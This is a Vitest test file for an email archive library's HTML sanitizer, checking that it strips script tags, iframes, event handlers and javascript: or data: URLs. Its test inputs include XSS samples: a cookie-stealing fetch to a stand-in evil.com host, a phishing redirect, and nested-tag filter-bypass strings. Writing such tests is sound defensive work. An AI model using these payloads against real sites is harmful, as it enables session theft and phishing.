import { beforeEach, describe, expect, it, vi } from "vitest";
import { sanitizeEmailHtml } from "../archive.js";

// Mock the getArchivedEmail function for testing
vi.mock("../archive.js", async () => {
  const actual =
    await vi.importActual<typeof import("../archive.js")>("../archive.js");
  return {
    ...actual,
    getArchivedEmail: vi.fn(),
  };
});

import { getArchivedEmail } from "../archive.js";

describe("Archive Utilities", () => {
  beforeEach(() => {
    vi.clearAllMocks();
  });

  describe("getArchivedEmail (integration test)", () => {
    const mockMessageId = "test-message-123";
    const mockArchiveArn =
      "arn:aws:ses:us-east-1:123456789012:archive/test-archive";
    const mockRegion = "us-east-1";

    it("should be mockable for service integration tests", async () => {
      const mockEmail = {
        messageId: mockMessageId,
        from: "sender@example.com",
        to: "recipient@example.com",
        subject: "Test Email",
        html: "<html><body><h1>Hello World</h1></body></html>",
        text: "Hello World",
        attachments: [],
        headers: {
          "content-type": "text/html; charset=utf-8",
        },
        timestamp: new Date("2025-01-14T00:00:00Z"),
        metadata: {
          senderIp: "192.168.1.1",
          tlsProtocol: "TLSv1.2",
        },
      };

      vi.mocked(getArchivedEmail).mockResolvedValue(mockEmail);

      const result = await getArchivedEmail(
        mockArchiveArn,
        mockMessageId,
        mockRegion
      );

      expect(result).toEqual(mockEmail);
      expect(vi.mocked(getArchivedEmail)).toHaveBeenCalledWith(
        mockArchiveArn,
        mockMessageId,
        mockRegion
      );
    });
  });

  describe("sanitizeEmailHtml", () => {
    it("should remove script tags", () => {
      const html = '<div>Content</div><script>alert("xss")</script>';
      const result = sanitizeEmailHtml(html);

      expect(result).not.toContain("<script");
      expect(result).not.toContain("alert");
      expect(result).toContain("<div>Content</div>");
    });

    it("should remove iframe tags", () => {
      const html = '<div>Content</div><iframe src="http://evil.com"></iframe>';
      const result = sanitizeEmailHtml(html);

      expect(result).not.toContain("<iframe");
      expect(result).toContain("<div>Content</div>");
    });

    it("should remove inline event handlers", () => {
      const html = '<div onclick="alert(1)">Content</div>';
      const result = sanitizeEmailHtml(html);

      expect(result).not.toContain("onclick");
      expect(result).toContain("Content");
    });

    it("should remove javascript: protocols", () => {
      const html = '<a href="javascript:alert(1)">Link</a>';
      const result = sanitizeEmailHtml(html);

      expect(result).not.toContain("javascript:");
      expect(result).toContain("Link");
    });

    it("should handle multiple dangerous elements", () => {
      const html = `
        <div onclick="bad()">Content</div>
        <script>malicious()</script>
        <iframe src="http://evil.com"></iframe>
        <a href="javascript:alert(1)">Link</a>
      `;
      const result = sanitizeEmailHtml(html);

      expect(result).not.toContain("<script");
      expect(result).not.toContain("<iframe");
      expect(result).not.toContain("onclick");
      expect(result).not.toContain("javascript:");
      expect(result).toContain("Content");
      expect(result).toContain("Link");
    });

    it("should preserve safe HTML", () => {
      const html = `
        <div class="container">
          <h1>Hello World</h1>
          <p style="color: blue;">This is a paragraph</p>
          <a href="https://example.com">Safe Link</a>
          <img src="https://example.com/image.jpg" alt="Image" />
        </div>
      `;
      const result = sanitizeEmailHtml(html);

      expect(result).toContain("<div");
      expect(result).toContain("<h1>");
      expect(result).toContain("<p");
      expect(result).toContain("<a href");
      expect(result).toContain("<img");
      expect(result).toContain("Hello World");
    });

    it("should handle empty string", () => {
      const result = sanitizeEmailHtml("");
      expect(result).toBe("");
    });

    it("should handle plain text without HTML", () => {
      const text = "Just plain text content";
      const result = sanitizeEmailHtml(text);
      expect(result).toBe(text);
    });

    it("should handle nested script tags", () => {
      const html =
        "<div><script>outer<script>inner</script>outer</script></div>";
      const result = sanitizeEmailHtml(html);

      expect(result).not.toContain("<script");
      // The regex removes script tags but may leave some text
      // This is acceptable as the dangerous tags are removed
      expect(result).toContain("<div>");
    });

    it("should remove onload, onerror, and other event handlers", () => {
      const html = `
        <img onload="malicious()" src="test.jpg" />
        <img onerror="bad()" src="test.jpg" />
        <body onload="evil()" />
      `;
      const result = sanitizeEmailHtml(html);

      expect(result).not.toContain("onload");
      expect(result).not.toContain("onerror");
      expect(result).not.toContain("malicious");
      expect(result).not.toContain("bad");
      expect(result).not.toContain("evil");
    });

    it("should handle various event handler patterns", () => {
      const html = `
        <div onmouseover="track()">Hover</div>
        <button onclick="submit()">Click</button>
        <form onsubmit="send()">Form</form>
      `;
      const result = sanitizeEmailHtml(html);

      expect(result).not.toContain("onmouseover");
      expect(result).not.toContain("onclick");
      expect(result).not.toContain("onsubmit");
      expect(result).toContain("Hover");
      expect(result).toContain("Click");
      expect(result).toContain("Form");
    });

    it("should remove javascript in various contexts", () => {
      const html = `
        <a href="javascript:void(0)">Link 1</a>
        <a href="JAVASCRIPT:alert(1)">Link 2</a>
        <img src="javascript:void(0)" />
      `;
      const result = sanitizeEmailHtml(html);

      // Case-insensitive removal of javascript:
      expect(result.toLowerCase()).not.toContain("javascript:");
      expect(result).toContain("Link 1");
      expect(result).toContain("Link 2");
    });

    it("should not break valid URLs", () => {
      const html = `
        <a href="https://example.com">HTTPS Link</a>
        <a href="http://example.com">HTTP Link</a>
        <a href="mailto:test@example.com">Email Link</a>
      `;
      const result = sanitizeEmailHtml(html);

      expect(result).toContain("https://example.com");
      expect(result).toContain("http://example.com");
      expect(result).toContain("mailto:test@example.com");
    });

    it("should handle complex malicious patterns", () => {
      const html = `
        <div onclick="fetch('http://evil.com/'+document.cookie)">Steal</div>
        <script>
          document.location='http://phishing.com';
        </script>
        <iframe src="javascript:document.write('<script src=evil.js></script>')"></iframe>
      `;
      const result = sanitizeEmailHtml(html);

      // Should remove the dangerous tags and attributes
      expect(result).not.toContain("onclick");
      expect(result).not.toContain("<script");
      expect(result).not.toContain("<iframe");
      // Note: The content itself may remain after removing the onclick attribute
      // What matters is the onclick handler is removed
    });

    // Tests for CodeQL security issue: Incomplete multi-character sanitization
    // https://github.com/wraps-team/wraps/security/code-scanning/11
    describe("nested tag bypass attacks (CodeQL issue #11-12)", () => {
      it("should prevent nested script tag bypass: <scr<script>ipt>", () => {
        const html = '<scr<script>ipt>alert("xss")</scr</script>ipt>';
        const result = sanitizeEmailHtml(html);

        // After sanitization, should not contain any script tags
        expect(result).not.toContain("<script");
        expect(result).not.toContain("</script");
        expect(result.toLowerCase()).not.toMatch(/<script/);
      });

      it("should prevent nested iframe tag bypass: <ifr<iframe>ame>", () => {
        const html = '<ifr<iframe>ame src="evil.com"></ifr</iframe>ame>';
        const result = sanitizeEmailHtml(html);

        expect(result).not.toContain("<iframe");
        expect(result).not.toContain("</iframe");
        expect(result.toLowerCase()).not.toMatch(/<iframe/);
      });

      it("should prevent multiple levels of nesting", () => {
        const html = '<scr<scr<script>ipt>ipt>alert("xss")</script>';
        const result = sanitizeEmailHtml(html);

        expect(result.toLowerCase()).not.toMatch(/<script/);
      });

      it("should prevent nested event handler bypass", () => {
        const html = '<div onon<a>click="alert(1)">Click</div>';
        const result = sanitizeEmailHtml(html);

        // Should not contain onclick after sanitization
        expect(result.toLowerCase()).not.toContain("onclick");
      });

      it("should prevent javascript: protocol bypass", () => {
        const html = '<a href="javajavascript:script:alert(1)">Link</a>';
        const result = sanitizeEmailHtml(html);

        expect(result.toLowerCase()).not.toContain("javascript:");
      });

      it("should handle data:text/html injection", () => {
        const html =
          '<a href="data:text/html,<script>alert(1)</script>">Link</a>';
        const result = sanitizeEmailHtml(html);

        expect(result.toLowerCase()).not.toContain("data:text/html");
      });

      it("should iteratively sanitize until stable", () => {
        // This tests the while loop that prevents bypass attacks
        const html = "<scr<scr<script>ipt>ipt>alert(1)</scr</script>ipt>";
        const result = sanitizeEmailHtml(html);

        // Should be completely sanitized, no script tags at all
        expect(result.toLowerCase()).not.toMatch(/<script/);
        expect(result.toLowerCase()).not.toMatch(/<\/script/);
      });
    });
  });
});
